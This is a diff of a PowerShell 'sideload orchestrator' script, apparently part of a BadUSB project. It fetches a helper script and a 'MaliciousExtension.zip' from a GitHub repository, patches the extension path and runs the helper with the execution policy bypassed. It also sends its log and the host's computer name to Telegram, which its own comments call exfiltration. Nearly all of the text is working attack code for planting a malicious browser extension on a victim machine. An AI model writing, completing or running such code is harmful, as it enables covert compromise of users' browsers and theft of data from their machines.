@@ -1,6 +1,4 @@
-# Sideload-Orchestrator.ps1
-# Downloads components, resolves paths, verifies updates, and orchestrates sideloading.
-# Includes fix for here-string terminator placement.
+# Sideload-Orchestrator.ps1 - VERSION WITH ONLY LONG PATH RESOLUTION ADDED
 
 # --- Configuration ---
 $Global:LogFile = "$env:TEMP\sideload_orchestrator_log.txt" # Make log file path global
@@ -10,7 +8,7 @@ $MainSideloadScriptUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main
 $ExtensionZipUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/MaliciousExtension.zip"
 # << END OF URLS >>
 
-$TempDir = "$env:TEMP\BrowserMod_Payload_$(Get-Random)" # Add random to avoid conflicts
+$TempDir = "$env:TEMP\BrowserMod_Payload_$(Get-Random)" # Add random
 $MainSideloadScriptPath = Join-Path $TempDir "Sideload-Extension.ps1"
 $ExtensionZipPath = Join-Path $TempDir "MyMaliciousExtension.zip"
 $ExtractedExtensionPath = Join-Path $TempDir "MyMaliciousExtension" # Initial (potentially short) path
@@ -20,7 +18,7 @@ function Write-Log {
     param([string]$Message)
     $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $LogEntry = "[$Timestamp] $Message"
-    Write-Host $LogEntry # For immediate feedback if window is visible
+    Write-Host $LogEntry
     Add-Content -Path $Global:LogFile -Value $LogEntry -ErrorAction SilentlyContinue
 }
 
@@ -124,7 +122,8 @@ try {
 # --- End Path Resolution ---
 
 # Modify the Sideload-Extension.ps1 to use the resolved long path
-Write-Log "Updating Sideload-Extension.ps1 with resolved extension source path: $longExtractedPath"
+# Write-Log "Updating Sideload-Extension.ps1 with correct extension source path: $ExtractedExtensionPath" # Original Log
+Write-Log "Updating Sideload-Extension.ps1 with resolved extension source path: $longExtractedPath" # New Log
 $placeholder = 'PLACEHOLDER_FOR_EXTENSION_PATH' # Must match placeholder in Sideload-Extension.ps1
 try {
     # Read with specific encoding
@@ -138,25 +137,9 @@ try {
         
         # Save back with specific encoding
         Set-Content -Path $MainSideloadScriptPath -Value $sideloadScriptContent -Force -Encoding UTF8 -ErrorAction Stop
-        Write-Log "Sideload-Extension.ps1 Set-Content executed."
-
-        # --- BEGIN VERIFICATION STEP ---
-        # Re-read the file immediately after saving to verify the change
-        Start-Sleep -Seconds 1 # Brief pause just in case of file system lag
-        $verifyContent = Get-Content -Path $MainSideloadScriptPath -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
-        if ($verifyContent -match [regex]::Escape($placeholder)) {
-            # If placeholder is STILL found after saving, something went wrong!
-            $errMsg = "FATAL ERROR: Placeholder STILL PRESENT in Sideload-Extension.ps1 after Set-Content! Path: $MainSideloadScriptPath"
-            Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
-        } elseif ($verifyContent -match [regex]::Escape($longExtractedPath)) {
-             # If the new path IS found, replacement likely succeeded
-             Write-Log "VERIFIED: Placeholder successfully replaced with path '$longExtractedPath' in Sideload-Extension.ps1."
-        } else {
-            # If neither placeholder nor new path found, file might be corrupt or empty
-             $errMsg = "FATAL ERROR: Could not verify placeholder replacement in Sideload-Extension.ps1. File might be corrupt or empty after Set-Content. Path: $MainSideloadScriptPath"
-             Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
-        }
-        # --- END VERIFICATION STEP ---
+        Write-Log "Sideload-Extension.ps1 Set-Content executed with path: $longExtractedPath" # Modified Log
+        
+        # NO VERIFICATION STEP HERE YET - Keeping it simple first
 
     } else {
         $errMsg = "Placeholder '$placeholder' not found in downloaded Sideload-Extension.ps1 ($MainSideloadScriptPath). Cannot update path."
@@ -168,21 +151,10 @@ catch {
     Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
 }
 
-# DEBUG: Verify path existence just before execution
-Write-Log "DEBUG: Verifying existence of resolved path for Sideload-Extension.ps1: $longExtractedPath"
-if (Test-Path $longExtractedPath) {
-    Write-Log "DEBUG: Resolved path $longExtractedPath EXISTS."
-} else {
-    Write-Log "DEBUG: CRITICAL - Resolved path $longExtractedPath DOES NOT EXIST before calling Sideload-Extension.ps1."
-    Send-TelegramNotification "DEBUG Orchestrator: Resolved path missing before calling Sideload-Extension.ps1: $longExtractedPath"
-    # Let Sideload-Extension.ps1 handle its own exit 1 in this case
-}
-
-# Execute the Main Sideloading Script
+# Execute the Main Sideloading Script (Using the original Start-Process method that worked before)
 Write-Log "Executing main sideloading script: $MainSideloadScriptPath"
 $SideloadExitCode = 1 # Default to error
 try {
-    # Using Start-Process as before, assuming this part was okay once orchestrator ran
     $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$MainSideloadScriptPath`"" -Wait -PassThru -NoNewWindow
     $SideloadExitCode = $process.ExitCode
     Write-Log "Main sideloading script execution finished with exit code: $SideloadExitCode"
@@ -197,11 +169,19 @@ catch {
     Write-Log $errMsg; Send-TelegramNotification $errMsg; # Don't exit, let log exfil happen
 }
 
-# Exfiltrate the orchestrator log file to Telegram
+# Exfiltrate the orchestrator log file to Telegram (Using the simpler format operator for now)
 if (Test-Path $Global:LogFile) {
     $logContent = Get-Content -Path $Global:LogFile -Raw -ErrorAction SilentlyContinue
     if ($logContent) {
         $logSnippet = $logContent.Substring(0, [System.Math]::Min($logContent.Length, 3500))
-        # Use Here-String for cleaner formatting - Ensure closing "@ is at start of line
-        $telegramMessage = @"
-Orchestrator Log ($($env:COMPUTERNAME)):
+        # Use format operator - less prone to syntax errors than here-string if not careful
+        $formatString = 'Orchestrator Log ({0}):`n```{1}```' # {0} for computername, {1} for snippet
+        $telegramMessage = $formatString -f $env:COMPUTERNAME, $logSnippet
+        Send-TelegramNotification $telegramMessage # Function already adds context
+    }
+}
+
+Write-Log "Sideload Orchestrator Finished."
+# Clean up (optional)
+# Write-Log "Cleaning up temporary files in $TempDir..."
+# Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
